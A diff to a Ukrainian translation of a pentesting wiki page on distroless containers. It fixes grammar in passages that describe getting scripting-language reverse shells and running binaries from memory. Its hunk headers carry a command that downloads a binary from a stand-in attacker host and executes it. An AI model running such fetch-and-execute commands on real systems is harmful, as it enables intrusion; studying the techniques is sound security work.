@@ -108,7 +108,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 
 Контейнери distroless містять лише **найнеобхідні компоненти для запуску конкретного застосунку або служби**, такі як бібліотеки та залежності виконання, але виключають більші компоненти, такі як менеджер пакетів, оболонка або системні утиліти.
 
-Мета контейнерів distroless полягає в тому, щоб **зменшити поверхню атаки контейнерів, усунувши непотрібні компоненти** та мінімізуючи кількість вразливостей, які можуть бути використані.
+Мета контейнерів distroless полягає в тому, щоб **зменшити поверхню атаки контейнерів, усунувши непотрібні компоненти** та мінімізувати кількість вразливостей, які можуть бути використані.
 
 ### Реверс-шел
 
@@ -118,7 +118,7 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Отже, ви **не зможете** отримати **реверс-шел** або **перерахувати** систему, як зазвичай.
 {% endhint %}
 
-Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-якої **скриптової мови**.
+Однак, якщо скомпрометований контейнер, наприклад, запускає flask web, тоді python встановлений, і тому ви можете отримати **Python реверс-шел**. Якщо він запускає node, ви можете отримати Node rev shell, і те ж саме з більшістю будь-яких **скриптових мов**.
 
 {% hint style="success" %}
 Використовуючи скриптову мову, ви могли б **перерахувати систему**, використовуючи можливості мови.
@@ -130,17 +130,17 @@ wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo
 Однак у таких контейнерах ці захисти зазвичай існують, але ви могли б використовувати **попередні техніки виконання в пам'яті, щоб обійти їх**.
 {% endhint %}
 
-Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE** для отримання реверс-шелів скриптових мов та виконання бінарних файлів з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
+Ви можете знайти **приклади** того, як **використовувати деякі вразливості RCE**, щоб отримати реверс-шели скриптових мов та виконувати бінарні файли з пам'яті за адресою [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).
 
 <figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Якщо вас цікавить **кар'єра в хакерстві** та зламати незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
+Якщо вас цікавить **кар'єра в хакінгу** та хакнути незламне - **ми наймаємо!** (_вимагається вільне володіння польською мовою в письмовій та усній формі_).
 
 {% embed url="https://www.stmcyber.com/careers" %}
 
 {% hint style="success" %}
-Вивчайте та практикуйте AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте хакінг AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте хакінг GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
